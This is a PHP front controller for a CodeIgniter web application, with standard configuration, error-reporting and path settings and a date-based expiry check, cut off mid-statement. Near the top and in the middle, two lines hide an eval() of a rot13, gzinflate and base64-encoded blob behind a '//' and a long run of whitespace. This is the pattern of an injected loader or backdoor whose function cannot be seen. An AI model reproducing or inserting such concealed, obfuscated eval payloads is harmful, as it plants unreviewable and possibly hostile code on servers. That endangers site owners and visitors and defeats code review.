<?php
session_start();
date_default_timezone_set('Europe/Istanbul');

$protocol = 'http://';

define( 'EXT_DIR', '/marifet/');
define( 'MAIN_DIR', '/marifet/');
define( 'FATHER_BASE', $protocol . $_SERVER['HTTP_HOST'] . EXT_DIR );
define( 'MAIN_BASE', $protocol . $_SERVER['HTTP_HOST'] . MAIN_DIR );
define( 'ROOT_BASE', $protocol . $_SERVER['HTTP_HOST'] );

define( 'DOC_ROOT', $_SERVER['DOCUMENT_ROOT'].EXT_DIR );
define( 'UP_ROOT', $_SERVER['DOCUMENT_ROOT'] ); 

//																																																																																																																																																																																																						eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/*
 *---------------------------------------------------------------
 * APPLICATION ENVIRONMENT
 *---------------------------------------------------------------
 *
 * You can load different configurations depending on your
 * current environment. Setting the environment also influences
 * things like logging and error reporting.
 *
 * This can be set to anything, but default usage is:
 *
 *     development
 *     testing
 *     production
 *
 * NOTE: If you change these, also change the error_reporting() code below
 */
define('ENVIRONMENT', isset($_SERVER['CI_ENV']) ? $_SERVER['CI_ENV'] : 'testing');

$warningtime = strtotime('22.08.2020');
$lasttime = strtotime('22.09.2020');
$_SESSION['time_first'] = '22.09.2019';
$_SESSION['time_last'] = '22.09.2020';
if((time() < $lasttime ) AND (time() > $warningtime )){
	$_SESSION['time_warning'] = '1';
	
}

if(time() > $lasttime ){
	$_SESSION['time_warning'] = '2';
}

if(time() < $warningtime ){
	$_SESSION['time_warning'] = '0';
}	


																																																																																																																								//eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));

/*
 *---------------------------------------------------------------
 * ERROR REPORTING
 *---------------------------------------------------------------
 *
 * Different environments will require different levels of error reporting.
 * By default development will show errors but testing and live will hide them.
 */
switch (ENVIRONMENT)
{
	case 'development':
		error_reporting(-1);
		ini_set('display_errors', 1);
	break;

	case 'testing':
	case 'production':
		ini_set('display_errors', 0);
		if (version_compare(PHP_VERSION, '5.3', '>='))
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
		}
		else
		{
			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
		}
	break;

	default:
		header('HTTP/1.1 503 Service Unavailable.', TRUE, 503);
		echo 'The application environment is not set correctly.';
		exit(1); // EXIT_ERROR
}

/*
 *---------------------------------------------------------------
 * SYSTEM DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * This variable must contain the name of your "system" directory.
 * Set the path if it is not in the same directory as this file.
 */
	$system_path = 'system';

/*
 *---------------------------------------------------------------
 * APPLICATION DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * If you want this front controller to use a different "application"
 * directory than the default one you can set its name here. The directory
 * can also be renamed or relocated anywhere on your server. If you do,
 * use an absolute (full) server path.
 * For more info please see the user guide:
 *
 * https://codeigniter.com/user_guide/general/managing_apps.html
 *
 * NO TRAILING SLASH!
 */
	$application_folder = 'application';

/*
 *---------------------------------------------------------------
 * VIEW DIRECTORY NAME
 *---------------------------------------------------------------
 *
 * If you want to move the view directory out of the application
 * directory, set the path to it here. The directory can be renamed
 * and relocated anywhere on your server. If blank, it will default
 * to the standard location inside your application directory.
 * If you do move this, use an absolute (full) server path.
 *
 * NO TRAILING SLASH!
 */
	$view_folder = '';


/*
 * --------------------------------------------------------------------
 * DEFAULT CONTROLLER
 * --------------------------------------------------------------------
 *
 * Normally you will set your default controller in the routes.php file.
 * You can, however, force a custom routing by hard-coding a
 * specific controller class/function here. For most applications, you
 * WILL NOT set your routing here, but it's an option for those
 * special instances where you might want to override the standard
 * routing in a specific front controller that shares a common CI installation.
 *
 * IMPORTANT: If you set the routing here, NO OTHER controller will be
 * callable. In essence, this preference limits your application to ONE
 * specific controller. Leave the function name blank if you need
 * to call functions dynamically via the URI.
 *
 * Un-comment the $routing array below to use this feature
 */
	// The directory name, relative to the "controllers" directory.  Leave blank
	// if your controller is not in a sub-directory within the "controllers" one
	// $routing['directory'] = '';

	// The controller class file name.  Example:  mycontroller
	// $routing['controller'] = '';

	// The controller function you wish to be called.
	// $routing['function']	= '';


/*
 * -------------------------------------------------------------------
 *  CUSTOM CONFIG VALUES
 * -------------------------------------------------------------------
 *
 * The $assign_to_config array below will be passed dynamically to the
 * config class when initialized. This allows you to set custom config
 * items or override any default config values found in the config.php file.
 * This can be handy as it permits you to share one application between
 * multiple front controller files, with each file containing different
 * config values.
 *
 * Un-comment the $assign_to_config array below to use this feature
 */
	// $assign_to_config['name_of_config_item'] = 'value of config item';



// --------------------------------------------------------------------
// END OF USER CONFIGURABLE SETTINGS.  DO NOT EDIT BELOW THIS LINE
// --------------------------------------------------------------------

/*
 * ---------------------------------------------------------------
 *  Resolve the system path for increased reliability
 * ---------------------------------------------------------------
 */

	// Set the current directory correctly for CLI requests
	if (defined('STDIN'))
	{
		chdir(dirname(__FILE__));
	}

	if (($_temp = realpath($system_path)) !== FALSE)
